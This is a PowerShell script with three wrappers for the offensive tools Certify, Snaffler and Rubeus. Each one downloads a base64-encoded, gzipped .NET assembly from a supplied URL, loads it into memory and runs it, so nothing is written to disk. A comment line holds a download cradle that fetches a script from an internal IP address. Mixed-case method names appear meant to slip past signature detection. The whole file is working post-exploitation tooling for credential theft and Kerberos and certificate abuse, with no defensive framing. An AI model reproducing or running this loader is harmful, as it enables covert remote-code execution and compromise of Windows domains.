# (New-Object Net.WebClient).DownloadString('http://10.10.1.5/Invoke-Stuff.ps1')

function Certify {
    [CmdletBinding()]
    param (
        [Parameter(Mandatory=$true, ValueFromPipeline=$true, ValueFromPipelineByPropertyName=$true, Position=0)]
        [string]$CmdArgs,

        [Parameter(Mandatory=$true, ValueFromPipeline=$true, ValueFromPipelineByPropertyName=$true, Position=0)]
        [string]$Path
    )

    process {
        $p = (New-Object Net.WebClient).DownloadString($Path)
        $a = New-Object IO.MemoryStream(,[Convert]::FromBAsE64String($p))
        $decompressed = New-Object IO.Compression.GzipStream($a,[IO.Compression.CoMPressionMode]::DEComPress)
        $output = New-Object System.IO.MemoryStream
        $decompressed.CopyTo( $output )
        [byte[]] $byteOutArray = $output.ToArray()
        $RAS = [System.Reflection.Assembly]::Load($byteOutArray)

        $OldConsoleOut = [Console]::Out
        $StringWriter = New-Object IO.StringWriter
        [Console]::SetOut($StringWriter)

        [Certify.Program]::main([string[]]$CmdArgs)

        [Console]::SetOut($OldConsoleOut)
        $Results = $StringWriter.ToString()
        $Results

        $p = $null
        $a = $null
        $decompressed = $null
        $byteOutArray = $null
        $output = $null
        $RAS = $null
        $OldConsoleOut = $null
        $StringWriter = $null
        $Results = $null
    }
}

function Snaffler {
    [CmdletBinding()]
    param (
        [Parameter(Mandatory=$true, ValueFromPipeline=$true, ValueFromPipelineByPropertyName=$true, Position=0)]
        [string]$CmdArgs,

        [Parameter(Mandatory=$true, ValueFromPipeline=$true, ValueFromPipelineByPropertyName=$true, Position=0)]
        [string]$Path
    )

    process {
        $p = (New-Object Net.WebClient).DownloadString($Path)
        $a = New-Object IO.MemoryStream(,[Convert]::FromBAsE64String($p))
        $decompressed = New-Object IO.Compression.GzipStream($a,[IO.Compression.CoMPressionMode]::DEComPress)
        $output = New-Object System.IO.MemoryStream
        $decompressed.CopyTo( $output )
        [byte[]] $byteOutArray = $output.ToArray()
        $RAS = [System.Reflection.Assembly]::Load($byteOutArray)

        $OldConsoleOut = [Console]::Out
        $StringWriter = New-Object IO.StringWriter
        [Console]::SetOut($StringWriter)

        [Snaffler.Snaffler]::main([string[]]$CmdArgs)

        [Console]::SetOut($OldConsoleOut)
        $Results = $StringWriter.ToString()
        $Results
    }
}

    function Rubeus {
        [CmdletBinding()]
        param (
            [Parameter(Mandatory=$true, ValueFromPipeline=$true, ValueFromPipelineByPropertyName=$true, Position=0)]
            [string]$CmdArgs,
    
            [Parameter(Mandatory=$true, ValueFromPipeline=$true, ValueFromPipelineByPropertyName=$true, Position=0)]
            [string]$Path
        )
    
        process {
            $p = (New-Object Net.WebClient).DownloadString($Path)
            $a = New-Object IO.MemoryStream(,[Convert]::FromBAsE64String($p))
            $decompressed = New-Object IO.Compression.GzipStream($a,[IO.Compression.CoMPressionMode]::DEComPress)
            $output = New-Object System.IO.MemoryStream
            $decompressed.CopyTo( $output )
            [byte[]] $byteOutArray = $output.ToArray()
            $RAS = [System.Reflection.Assembly]::Load($byteOutArray)
    
            $OldConsoleOut = [Console]::Out
            $StringWriter = New-Object IO.StringWriter
            [Console]::SetOut($StringWriter)
    
            [Rubeus.Program]::main([string[]]$CmdArgs)
    
            [Console]::SetOut($OldConsoleOut)
            $Results = $StringWriter.ToString()
            $Results
        }
    }